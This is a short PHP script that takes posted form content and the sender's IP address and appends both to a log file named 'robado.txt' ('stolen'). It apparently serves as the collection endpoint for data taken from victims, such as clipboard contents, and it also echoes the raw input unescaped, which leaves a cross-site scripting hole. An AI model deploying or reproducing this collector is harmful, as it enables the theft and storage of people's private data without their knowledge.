<?php
  // retrieve form content
  $content  = $_POST['content'];
  
  // retrieve user site url
  $refer_ip = $_SERVER['REMOTE_ADDR'];;
  
  // Open file
  $filename = "robado.txt";
  
  if ( !$handle = fopen($filename, 'a') ) {
         echo "Cannot open file ($filename)";
         exit;
   }
 
  
  $clipboard = "El contenido: " . $refer_ip . "\n\n " . $content;
  
  print $clipboard;
  
  if (fwrite($handle, $clipboard) === FALSE) {
       echo "Cannot write to file ($filename)";
       exit;
   }
  
  fclose($handle);

/**
por funcion
por objetivo
*/

?>

